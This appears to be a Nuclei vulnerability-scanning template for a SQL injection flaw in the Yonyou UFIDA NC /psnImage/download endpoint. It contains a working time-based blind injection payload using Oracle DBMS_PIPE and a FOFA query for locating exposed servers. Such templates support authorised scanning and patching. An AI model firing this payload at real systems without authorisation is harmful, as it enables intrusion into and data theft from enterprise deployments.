id: yonyou-ufida-nc-psnImage-download-sqli

info:
  name: 用友NC接口/psnImage/download存在SQL注入漏洞
  author: xx
  severity: high
  description: 用友NC接口/psnImage/download存在SQL注入漏洞
  metadata:
    fofa-query: app="用友-UFIDA-NC"
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - raw:
      - |
        @timeout: 30s
        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),8)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
        Host: {{Hostname}}

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 500"
          - "duration>=5"
        condition: and
